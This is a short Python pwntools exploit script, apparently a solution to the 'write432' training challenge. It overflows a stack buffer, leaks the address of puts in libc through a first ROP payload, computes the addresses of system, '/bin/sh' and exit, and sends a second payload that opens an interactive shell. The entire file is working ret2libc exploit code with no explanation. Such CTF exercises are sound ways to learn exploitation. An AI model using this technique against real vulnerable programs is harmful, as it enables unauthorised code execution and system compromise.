from pwn import *
import struct

junk         = "A"*44
main         = p32(0x804857b)
puts_plt     = p32(0x8048420)
puts_got     = p32(0x804a014)


gdb_cmd = [
    "b *0x0804864b",
    "c"
        ]

r = process('./write432')

#gdb.attach(r, gdbscript = "\n".join(gdb_cmd))

def pwnSecond(leak):
	puts_libc = u32(leak)
	libc_base = puts_libc+0x14-0x67274+0x20
	system_addr = libc_base + 0x3cd00
	bin_sh = libc_base + 0x17b968
	exit = libc_base + 0x300c0
	log.info("puts@libc: 0x%x" % puts_libc)
	log.info("libc base: 0x%x" % libc_base)
	log.info("libc system: 0x%x" % system_addr)
	log.info("binsh: 0x%x" % bin_sh)
	log.info("exit: 0x%x" % exit)
	payload2 = junk + p32(system_addr) + p32(exit) + p32(bin_sh)
	print r.recvuntil('> ')
	r.sendline(payload2)
	r.interactive()

def pwnFirst():
    payload = junk + puts_plt + main + puts_got
    print r.recvuntil('> ')
    r.sendline(payload)
    leak = r.recv(4)
    pwnSecond(leak)

if __name__ == "__main__":
    pwnFirst()
